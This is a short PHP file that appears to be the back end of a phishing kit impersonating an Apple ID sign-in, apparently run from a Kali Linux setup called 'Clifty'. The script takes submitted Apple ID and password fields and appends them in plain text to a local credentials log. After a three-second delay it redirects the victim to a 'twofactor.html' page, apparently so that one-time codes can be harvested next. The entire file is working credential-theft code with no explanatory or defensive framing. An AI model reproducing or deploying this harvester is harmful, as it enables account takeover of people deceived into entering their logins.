<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the submitted form data
    $apple_id = htmlspecialchars($_POST['apple-id']);
    $password = htmlspecialchars($_POST['password']);

    // Define the path to the credentials file
    $file_path = "/home/kali/Clifty/logs/credentials.txt";

    // Ensure the directory exists
    if (!file_exists('/home/kali/Clifty/logs/')) {
        mkdir('/home/kali/Clifty/logs/', 0777, true);
    }

    // Save the credentials to the file
    $file = fopen($file_path, "a");
    if ($file) {
        fwrite($file, "Apple ID: " . $apple_id . " | Password: " . $password . "\n");
        fclose($file);
    } else {
        error_log("Unable to open file: " . $file_path);
    }

    // Delay for 3 seconds and then redirect to the 2FA page
    sleep(3);
    header("Location: twofactor.html");
    exit();
}
?>
